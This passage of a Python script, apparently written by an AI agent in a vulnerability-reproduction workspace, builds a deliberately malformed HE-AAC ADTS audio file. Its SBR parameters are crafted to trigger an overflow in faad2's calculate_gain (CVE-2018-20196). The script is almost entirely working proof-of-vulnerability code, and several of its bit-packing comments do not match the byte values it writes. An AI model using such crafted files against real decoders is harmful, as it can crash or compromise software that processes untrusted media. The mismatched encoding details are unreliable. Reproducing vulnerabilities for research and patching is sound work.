_extra_1 (1 bit) = 1 (enable extra header)\n    # bs_header_extra_2 (1 bit) = 0\n    \n    # Combine: 1|0101|1110|011|00|1|0 = 0xAE6A\n    header_bits = 0xAE6A\n    data.extend(struct.pack(\'>H\', header_bits))\n    \n    # Extra header 1 (since bs_header_extra_1 = 1):\n    # bs_freq_scale (2 bits) = 2\n    # bs_alter_scale (1 bit) = 1\n    # bs_noise_bands (2 bits) = 2\n    # Combine: 10|1|10 = 0xB4 (shift left 3 bits)\n    extra_header = 0xB4\n    data.append(extra_header)\n    \n    # bs_limiter_bands (2 bits) = 3 (use limiter table 3, most complex)\n    # bs_limiter_gains (2 bits) = 2\n    # bs_interpolFreq (1 bit) = 1\n    # bs_smoothingMode (1 bit) = 1\n    # Combine: 11|10|1|1 = 0xF4 (shift left 2 bits)\n    limiter_info = 0xF4\n    data.append(limiter_info)\n    \n    return bytes(data)\n\n\ndef make_sbr_grid_and_data():\n    """Create SBR grid and envelope/noise data"""\n    \n    data = bytearray()\n    \n    # bs_frame_class (2 bits) = 1 (FIXFIX)\n    # bs_num_env (2 bits) = 1 (2 envelopes, encoded as 1)\n    # Combine: 01|01 = 0x50\n    data.append(0x50)\n    \n    # For FIXFIX with 2 envelopes, need bs_freq_res bits\n    # bs_freq_res[0] (1 bit) = 1\n    # bs_freq_res[1] (1 bit) = 1\n    # Combine with other bits: 11 = 0xC0\n    data.append(0xC0)\n    \n    # Envelope data - use simple values\n    # bs_df_env (1 bit) = 0 (delta coding from left)\n    # Then envelope scalefactor deltas (Huffman coded)\n    # Use simple pattern with small deltas\n    for _ in range(20):\n        data.append(0x00)  # Huffman codes for small values\n    \n    # Noise floor data\n    for _ in range(10):\n        data.append(0x00)\n    \n    # Sinusoidal coding data\n    # bs_add_harmonic_flag (1 bit) = 0\n    data.append(0x00)\n    \n    # Padding\n    data.extend(b\'\\x00\' * 50)\n    \n    return bytes(data)\n\n\ndef make_aac_frame_with_sbr():\n    """Create an AAC frame with SBR extension for stereo CPE."""\n    \n    frame_data = bytearray()\n    \n    # ID_CPE (3 bits) = 1, element_instance_tag (4 bits) = 0\n    # common_window (1 bit) = 1\n    # Combine: 001|0000|1 = 0x21\n    frame_data.append(0x21)\n    \n    # ICS info for common window\n    # ics_reserved_bit (1 bit) = 0\n    # window_sequence (2 bits) = 0 (ONLY_LONG_SEQUENCE)\n    # window_shape (1 bit) = 0\n    # max_sfb (6 bits) = 10\n    # Combine: 0|00|0|001010 = 0x0A\n    frame_data.append(0x0A)\n    \n    # scale_factor_grouping (7 bits) = 0\n    # predictor_data_present (1 bit) = 0\n    frame_data.append(0x00)\n    \n    # ms_mask_present (2 bits) = 0\n    # Combine with section data start: 00 = 0x00\n    frame_data.append(0x00)\n    \n    # Minimal spectral data for both channels\n    frame_data.extend(b\'\\x00\' * 80)\n    \n    # Add SBR extension element (ID_FIL)\n    # ID_FIL (3 bits) = 6, followed by count\n    # 110 = 0xC0 (top 3 bits)\n    frame_data.append(0xDF)  # ID_FIL with some padding\n    \n    # Create SBR data\n    sbr_header = make_sbr_header()\n    sbr_grid = make_sbr_grid_and_data()\n    sbr_data = sbr_header + sbr_grid\n    \n    # Extension count (255 = use extended form)\n    ext_len = len(sbr_data) + 2\n    if ext_len >= 255:\n        frame_data.append(255)\n        frame_data.append((ext_len - 255) & 0xFF)\n    else:\n        frame_data.append(ext_len & 0xFF)\n    \n    # extension_type (4 bits) = 13 (EXT_SBR_DATA)\n    # Combine: 1101 = 0xD0\n    frame_data.append(0xD0)\n    \n    # bs_extension_id (2 bits) = 2 (SBR_EXTENSION_CRC)\n    # Combine: 10 = 0x80\n    frame_data.append(0x80)\n    \n    # Add SBR data\n    frame_data.extend(sbr_data)\n    \n    # ID_END (3 bits) = 7\n    # 111 = 0xE0\n    frame_data.append(0xE0)\n    \n    return bytes(frame_data)\n\n\ndef generate_testcase(output_path):\n    """Generate the malicious ADTS AAC file."""\n    \n    print(f"Generating malicious HE-AAC ADTS file: {output_path}")\n    \n    # HE-AAC profile parameters\n    profile = 2  # AAC LC\n    sample_rate_idx = 4  # 44100 Hz\n    channel_config = 2  # Stereo (CPE)\n    \n    # Create AAC frame with SBR\n    frame_data = make_aac_frame_with_sbr()\n    \n    # Calculate total frame length\n    frame_length = 7 + len(frame_data)\n    \n    # Create ADTS header\n    adts_header = make_adts_header(profile, sample_rate_idx, channel_config, frame_length)\n    \n    # Write to file\n    with open(output_path, \'wb\') as f:\n        f.write(adts_header)\n        f.write(frame_data)\n    \n    print(f"Generated {len(adts_header) + len(frame_data)} bytes")\n    print("SBR parameters designed to maximize M and trigger overflow in calculate_gain()")\n    print("Done!")\n\n\nif __name__ == \'__main__\':\n    output_path = \'/home/ubuntu/PoV/DrillAgent/workspace-sonnet/faad2.cve-2018-20196/round2/testcase-round2\'\n    generate_testcase(output_path)\n'}
